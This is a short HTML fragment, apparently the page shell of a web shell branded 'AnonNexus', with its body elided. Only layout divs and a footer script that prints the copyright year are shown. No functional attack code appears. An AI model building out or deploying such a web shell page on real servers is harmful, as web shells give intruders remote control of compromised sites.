...
<head>
  ...
  <title>AnonNexus Web SheLL</title>
</head>
  ...
  <div class="container-fluid">
    <div class="py-3" id="main">
      <div class="box shadow bg-dark p-4 rounded-3">
        ...
        <div class="text-light">&#169; AnonNexus <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
      </div>
    </div>
  </div>
